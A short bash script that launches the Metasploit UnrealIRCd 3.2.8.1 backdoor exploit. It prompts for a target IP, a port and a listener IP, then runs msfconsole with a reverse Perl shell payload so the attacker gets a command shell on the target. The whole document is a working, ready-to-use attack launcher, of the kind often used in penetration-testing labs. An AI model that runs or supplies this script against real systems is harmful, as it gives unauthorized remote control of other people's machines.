#!/bin/bash

#This script utilizes the metasploit-framework to run an exploit against a service running UnrealIRCd 3.2.8.1

#Takes user input for target IP
echo "Enter a target host"
read RHOST1

#port should be preconfigured ut just incase take user input
echo "Enter a target port"
read RPORT1

#takes user input for local host IP for the reverse shell
echo "enter listening machine IP for reverse TCP"
read LHOST1

#run msfconsole using 
msfconsole -x "use exploit/unix/irc/unreal_ircd_3281_backdoor;\
	set PAYLOAD payload/cmd/unix/reverse_perl;\
	set RHOST $RHOST1;\
	set RPORT $RPORT1;\
	set LHOST $LHOST1;\
	exploit"

#command shell should automatically open but if not use sessions command to connect
